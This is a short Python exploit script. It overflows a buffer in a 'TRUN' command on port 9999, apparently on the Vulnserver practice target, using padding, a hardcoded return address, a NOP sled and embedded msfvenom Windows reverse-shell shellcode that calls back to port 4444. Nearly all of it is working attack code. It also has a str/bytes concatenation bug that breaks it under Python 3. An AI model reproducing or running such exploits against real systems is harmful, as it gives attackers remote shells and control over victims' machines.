#!/usr/bin/python3

# ShellCode

import sys, socket

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.0 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "<badchars>"
overflow = ("\xbe\x1a\x4f\x94\xcf\xd9\xe8\xd9\x74\x24\xf4\x5a\x2b\xc9"
"\xb1\x52\x31\x72\x12\x03\x72\x12\x83\xd8\x4b\x76\x3a\x20"
"\xbb\xf4\xc5\xd8\x3c\x99\x4c\x3d\x0d\x99\x2b\x36\x3e\x29"
"\x3f\x1a\xb3\xc2\x6d\x8e\x40\xa6\xb9\xa1\xe1\x0d\x9c\x8c"
"\xf2\x3e\xdc\x8f\x70\x3d\x31\x6f\x48\x8e\x44\x6e\x8d\xf3"
"\xa5\x22\x46\x7f\x1b\xd2\xe3\x35\xa0\x59\xbf\xd8\xa0\xbe"
"\x08\xda\x81\x11\x02\x85\x01\x90\xc7\xbd\x0b\x8a\x04\xfb"
"\xc2\x21\xfe\x77\xd5\xe3\xce\x78\x7a\xca\xfe\x8a\x82\x0b"
"\x38\x75\xf1\x65\x3a\x08\x02\xb2\x40\xd6\x87\x20\xe2\x9d"
"\x30\x8c\x12\x71\xa6\x47\x18\x3e\xac\x0f\x3d\xc1\x61\x24"
"\x39\x4a\x84\xea\xcb\x08\xa3\x2e\x97\xcb\xca\x77\x7d\xbd"
"\xf3\x67\xde\x62\x56\xec\xf3\x77\xeb\xaf\x9b\xb4\xc6\x4f"
"\x5c\xd3\x51\x3c\x6e\x7c\xca\xaa\xc2\xf5\xd4\x2d\x24\x2c"
"\xa0\xa1\xdb\xcf\xd1\xe8\x1f\x9b\x81\x82\xb6\xa4\x49\x52"
"\x36\x71\xdd\x02\x98\x2a\x9e\xf2\x58\x9b\x76\x18\x57\xc4"
"\x67\x23\xbd\x6d\x0d\xde\x56\x52\x7a\xe1\xa6\x3a\x79\xe1"
"\xb7\xe6\xf4\x07\xdd\x06\x51\x90\x4a\xbe\xf8\x6a\xea\x3f"
"\xd7\x17\x2c\xcb\xd4\xe8\xe3\x3c\x90\xfa\x94\xcc\xef\xa0"
"\x33\xd2\xc5\xcc\xd8\x41\x82\x0c\x96\x79\x1d\x5b\xff\x4c"
"\x54\x09\xed\xf7\xce\x2f\xec\x6e\x28\xeb\x2b\x53\xb7\xf2"
"\xbe\xef\x93\xe4\x06\xef\x9f\x50\xd7\xa6\x49\x0e\x91\x10"
"\x38\xf8\x4b\xce\x92\x6c\x0d\x3c\x25\xea\x12\x69\xd3\x12"
"\xa2\xc4\xa2\x2d\x0b\x81\x22\x56\x71\x31\xcc\x8d\x31\x51"
"\x2f\x07\x4c\xfa\xf6\xc2\xed\x67\x09\x39\x31\x9e\x8a\xcb"
"\xca\x65\x92\xbe\xcf\x22\x14\x53\xa2\x3b\xf1\x53\x11\x3b"
"\xd0")

# Return address (0x625011af) presented in "Little Indian" format i.e x86 arch
# "\x90" is NOP (NO Operation)
shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.1.0", 9999))
	payload = b"TRUN /.:/ " + shellcode
	s.send((payload))
	s.close()
	
except:
	print("[-] Error connecting to server")
	sys.exit()
	
